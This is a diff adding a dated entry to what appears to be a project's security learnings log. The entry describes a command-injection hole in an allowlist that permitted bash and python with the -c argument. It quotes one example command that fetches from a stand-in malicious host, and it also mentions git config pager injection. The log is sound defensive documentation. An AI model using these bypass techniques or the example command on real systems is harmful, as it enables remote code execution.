@@ -26,3 +26,8 @@
 **Vulnerability:** The Git wrapper allowed users to set arbitrary `git config` options and use global options like `-p`, which could be exploited for command injection via malicious configurations (e.g. `core.pager`).
 **Learning:** Checking for flags naively without considering subcommand position allows bypassing filters. Subcommand-specific arguments (like `git log -p`) can overlap with global arguments (like `git -p status`) if not tracked via their position.
 **Prevention:** Iterating through the tokens to locate the subcommand index allows separating global configuration/options (which shouldn't be overridden interactively) from safe, localized parameters (e.g., specific `-p` or `--patch` uses).
+
+## 2024-07-27 - [Command Injection via Inadequate Command Restriction on Allowlisted Binaries]
+**Vulnerability:** Command injection/arbitrary script execution in `codex_tas_runner.py`. The `validate_script` function authorized executions like `bash`, `python`, and `python3`, but did not restrict their arguments. This allowed bypassing the `ALLOWED_COMMANDS` check by passing arbitrary commands using the `-c` argument (e.g., `bash -c 'wget http://malicious'`).
+**Learning:** Allowlisting binaries that can execute code or sub-processes natively (like `bash`, `sh`, `python`, `node`) is dangerous if the arguments are not properly scrutinized. Validating just the root command is insufficient.
+**Prevention:** Explicitly block execution string arguments (such as `-c` or `-e`) for allowlisted binaries that have code-execution capabilities when processing shell arguments.
